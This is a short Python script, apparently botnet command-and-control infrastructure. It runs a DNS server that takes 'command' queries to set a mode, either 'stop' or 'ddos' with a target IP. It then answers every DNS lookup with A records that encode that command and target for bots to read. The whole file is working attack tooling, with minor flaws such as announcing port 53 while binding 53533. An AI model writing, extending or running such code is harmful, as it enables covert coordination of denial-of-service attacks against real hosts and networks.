#!/usr/bin/env python3
import socket
from dnslib import DNSRecord, QTYPE, RR, A
debugging = True

# Class to store command data
class Command:
    def __init__(self, cmd):
        self.cmd = cmd
        self.ip = None


def dns_response(data, cmd):
    request = DNSRecord.parse(data)
    

    print("Received query: ", request) if debugging else None
    
    reply = request.reply()
    qname = request.q.qname
    qtype = request.q.qtype
    ips = []  # Example IP address to return for all queries

    # Check if the the incoming traffic is a command
    ident =str(qname).split('.') 
    if ident[0].lower() == "command":
        cmd.cmd = ident[1].lower()
        if cmd.cmd == "ddos":
            cmd.ip = ident[2].split('-')

   # Check the command and set up an array of ip addresses to return
    match cmd.cmd:
        case "stop":
            ips = ["1.41.41.41"]
        case "ddos":
            ip1 = "2." + cmd.ip[0] + "." + cmd.ip[1] + "." + cmd.ip[2]
            ip2 = cmd.ip[3] + ".25.25.25"
            ips = [ip1, ip2]


    # Create a DNS reply record
    for ip in ips:
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=60))
    
    # Return the reply packet
    return reply.pack(), cmd

def main():
    currentCMD = Command("stop")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.bind(("0.0.0.0", 53533))
        print("DNS Server listening on port 53")
        while True:
            data, addr = s.recvfrom(512)
            response = dns_response(data, currentCMD)
            currentCMD = response[1]
            s.sendto(response[0], addr)

if __name__ == "__main__":
    main()

